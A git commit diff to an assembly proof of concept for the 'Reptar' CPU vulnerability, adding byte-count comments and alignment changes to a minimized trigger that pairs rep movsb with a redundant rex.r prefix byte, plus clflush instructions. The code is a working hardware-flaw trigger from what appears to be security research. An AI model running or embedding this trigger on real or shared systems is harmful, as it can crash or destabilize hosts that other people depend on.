7be48a9f8b6e59f0363589c52780bbd036fcd520
eduardo <sirdarckcat@gmail.com>
2023-11-24 20:25:40 +0100

    document a bit whats going on with alignment

--- pocs/cpus/reptar/minimized/reptar.align.asm
+++ pocs/cpus/reptar/minimized/reptar.align.asm
@@ -14,21 +14,25 @@ section .text
         .many_reptars:
         %rep 1
             align 0x1000
-            times 4 nop
-            dec rsi
-            dec rdi
-            inc rbx
-            inc rcx
-            clflush [rdi]
-            clflush [rsi+64]
-            mov [rsp], rbx
-            rep
-            db 0x44; rex.r
-            movsb
-            rep
+            ; 16 bytes
+            times 4 nop ; 4 bytes
+            dec rsi     ; 3 bytes
+            dec rdi     ; 3 bytes
+            inc rbx     ; 3 bytes
+            inc rcx     ; 3 bytes
+            ; 16 bytes
+            clflush [rdi]    ; 3 bytes
+            clflush [rsi+64] ; 4 bytes
+            mov [rsp], rbx   ; 4 bytes
+            rep              ; 1 byte
+            db 0x44; rex.r   ; 1 byte
+            movsb            ; 1 byte
+            rep              ; 1 byte
+            nop              ; 1 byte
         %endrep
         .suffix:
-        times 1024*32 rep pause
+        align 0x1000
+        times 0x1000*8 rep pause
         .exit:
         mov dil, bl ; counter
         syscall
